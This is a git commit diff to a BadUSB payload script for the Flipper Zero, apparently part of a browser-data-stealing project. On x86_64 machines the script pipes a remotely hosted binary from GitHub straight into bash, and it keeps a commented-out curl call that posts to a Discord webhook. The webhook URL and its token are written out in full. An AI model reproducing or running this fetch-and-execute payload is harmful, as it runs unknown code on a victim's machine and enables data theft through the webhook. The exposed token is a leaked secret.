b0eeac2d0a810dd7e05062bf20792d861297cf91
Chris <christophe.da.cruz.tic@gmail.com>
2023-12-09 11:05:10 +0100

    Location files for download

--- badusb/BrowserData/discord_wh_linux.sh
+++ badusb/BrowserData/discord_wh_linux.sh
@@ -3,8 +3,7 @@ architecture=$(uname -m)
 if [ "$architecture" == "armv7l" ]; then
     echo "L'architecture est ARM."
 elif [ "$architecture" == "x86_64" ]; then
-    curl -sSL https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/discord_wh_linux.sh | bash
-    echo "L'architecture est AMD64 (64 bits)."
+    curl -sSL https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/External/linux_amd64 | bash
 elif [ "$architecture" == "i686" ] || [ "$architecture" == "i386" ]; then
     echo "L'architecture est x86 (32 bits)."
 else
@@ -12,8 +11,8 @@ else
 fi
 
 
-export WEBHOOK_URL="https://discord.com/api/webhooks/1180459253924909118/JP-HpTFSYUStv8nitmhmXn_nJzOTdCY84f7YhNOhbXtkSm-5ERSGWk4Bsey8oxvrDJpx"
-curl \
-  -H "Content-Type: application/json" \
-  -d '{"username": "Murerig", "content": "Coin ? 🦆"}' \
-  $WEBHOOK_URL
+#export WEBHOOK_URL="https://discord.com/api/webhooks/1180459253924909118/JP-HpTFSYUStv8nitmhmXn_nJzOTdCY84f7YhNOhbXtkSm-5ERSGWk4Bsey8oxvrDJpx"
+#curl \
+#  -H "Content-Type: application/json" \
+#  -d '{"username": "Murerig", "content": "Coin ? 🦆"}' \
+#  $WEBHOOK_URL
